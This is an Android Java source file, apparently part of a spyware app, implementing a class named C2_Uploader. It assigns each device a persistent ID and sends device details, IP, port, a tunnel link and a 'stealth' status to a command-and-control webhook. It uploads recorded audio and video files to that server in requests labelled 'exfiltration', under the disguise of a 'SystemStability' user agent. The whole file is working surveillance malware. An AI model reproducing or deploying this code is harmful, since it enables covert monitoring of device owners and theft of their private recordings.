package com.labs.labrats;

import android.content.Context;
import android.os.Build;
import android.provider.Settings;
import android.util.Log;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.UUID;

public class C2_Uploader {
    private static final String TAG = "C2_Uploader";
    private static String cachedDeviceId = null;

    /**
     * Gets a persistent, unique identifier for this device.
     */
    public static String getDeviceId(Context context) {
        if (cachedDeviceId != null) return cachedDeviceId;
        
        String id = context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                .getString("c2_device_id", null);
        
        if (id == null) {
            // High-entropy combination of Android ID and a random UUID
            String androidId = Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
            id = (androidId != null ? androidId : "") + "_" + UUID.randomUUID().toString().substring(0, 8);
            context.getSharedPreferences("StabilityConfig", Context.MODE_PRIVATE)
                    .edit().putString("c2_device_id", id).apply();
        }
        
        cachedDeviceId = id;
        return id;
    }

    /**
     * Reports current device status to the backend.
     */
    public static void checkIn(Context context) {
        String c2Url = BuildConfig.WEBHOOK_URL;
        if (c2Url == null || c2Url.isEmpty()) return;

        new Thread(() -> {
            try {
                String ip = MainActivity.getLocalIpAddress();
                int port = FirebaseConfig.DEFAULT_PORT;
                
                JSONObject status = new JSONObject();
                status.put("deviceId", getDeviceId(context));
                status.put("type", "checkin");
                status.put("model", Build.MODEL);
                status.put("os", Build.VERSION.RELEASE);
                status.put("battery", SystemAnalytics.getBatteryLevel(context) + "%");
                status.put("ip", ip);
                status.put("port", port);
                status.put("link", "/tunnel?deviceId=" + getDeviceId(context));
                status.put("stealth", SystemAnalytics.isStealthEnabled(context));
                
                postJsonSync(c2Url, status.toString());
            } catch (Exception e) {
                Log.e(TAG, "Check-in failed: " + e.getMessage());
            }
        }).start();
    }

    /**
     * Synchronous JSON POST method for C2 communication.
     */
    public static void postJsonSync(String urlString, String json) {
        HttpURLConnection conn = null;
        try {
            URL url = new URL(urlString);
            conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json; charset=utf-8");
            conn.setRequestProperty("User-Agent", "SystemStability/1.5");
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setDoOutput(true);

            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = json.getBytes(StandardCharsets.UTF_8);
                os.write(input, 0, input.length);
            }

            int code = conn.getResponseCode();
            Log.d(TAG, "C2 JSON POST Response: " + code);
        } catch (Exception e) {
            Log.e(TAG, "C2 POST Error: " + e.getMessage());
        } finally {
            if (conn != null) conn.disconnect();
        }
    }

    /**
     * Async JSON POST method for C2 communication.
     */
    public static void postJson(String urlString, String json) {
        new Thread(() -> postJsonSync(urlString, json)).start();
    }

    public static void uploadFile(Context context, File file) {
        if (file == null || !file.exists() || !file.canRead()) {
            Log.e(TAG, "UPLOAD_ERROR: File is invalid or inaccessible.");
            return;
        }

        String webhookUrl = BuildConfig.WEBHOOK_URL;
        if (webhookUrl == null || webhookUrl.isEmpty()) {
            Log.e(TAG, "UPLOAD_ERROR: No C2 URL defined.");
            FirebaseConfig.logActivity("DATA_SYNC_ERROR: No remote C2 URL configured.");
            return;
        }

        new Thread(() -> {
            HttpURLConnection conn = null;
            DataOutputStream dos = null;
            String boundary = "---" + System.currentTimeMillis() + "---";
            String lineEnd = "\r\n";
            String twoHyphens = "--";

            try {
                FirebaseConfig.logActivity("DATA_UPLINK: Exfiltrating " + file.getName() + " to C2...");
                
                URL url = new URL(webhookUrl);
                conn = (HttpURLConnection) url.openConnection();
                conn.setDoInput(true);
                conn.setDoOutput(true);
                conn.setUseCaches(false);
                conn.setRequestMethod("POST");
                conn.setConnectTimeout(60000);
                conn.setReadTimeout(60000);
                conn.setRequestProperty("Connection", "Keep-Alive");
                conn.setRequestProperty("User-Agent", "SystemStability/1.5");
                conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
                
                // Add Device ID as a header for easier filtering on Render backend
                conn.setRequestProperty("X-Device-ID", getDeviceId(context));

                dos = new DataOutputStream(conn.getOutputStream());

                // Field: deviceId
                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"deviceId\"" + lineEnd + lineEnd);
                dos.writeBytes(getDeviceId(context) + lineEnd);

                // Field: reqtype
                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"reqtype\"" + lineEnd + lineEnd);
                dos.writeBytes("exfiltration" + lineEnd);

                // File part
                String mimeType = file.getName().toLowerCase().endsWith(".m4a") ? "audio/mpeg" : "video/mp4";
                dos.writeBytes(twoHyphens + boundary + lineEnd);
                dos.writeBytes("Content-Disposition: form-data; name=\"fileToUpload\"; filename=\"" + file.getName() + "\"" + lineEnd);
                dos.writeBytes("Content-Type: " + mimeType + lineEnd);
                dos.writeBytes(lineEnd);

                try (FileInputStream fis = new FileInputStream(file)) {
                    byte[] buffer = new byte[32768];
                    int bytesRead;
                    while ((bytesRead = fis.read(buffer)) != -1) {
                        dos.write(buffer, 0, bytesRead);
                    }
                }

                dos.writeBytes(lineEnd);
                dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
                dos.flush();

                int serverResponseCode = conn.getResponseCode();
                if (serverResponseCode == 200 || serverResponseCode == 201) {
                    FirebaseConfig.logActivity("DATA_SYNC_SUCCESS: " + file.getName() + " uploaded.");
                } else {
                    Log.e(TAG, "Upload Failed. Code: " + serverResponseCode);
                    FirebaseConfig.logActivity("DATA_SYNC_WARNING: Upload failed (Error " + serverResponseCode + ")");
                }

            } catch (Exception e) {
                Log.e(TAG, "Upload Exception: " + e.getMessage());
                FirebaseConfig.logActivity("DATA_SYNC_ERROR: Network timeout during exfiltration.");
            } finally {
                try { if (dos != null) dos.close(); } catch (Exception ignored) {}
                if (conn != null) conn.disconnect();
            }
        }).start();
    }
}
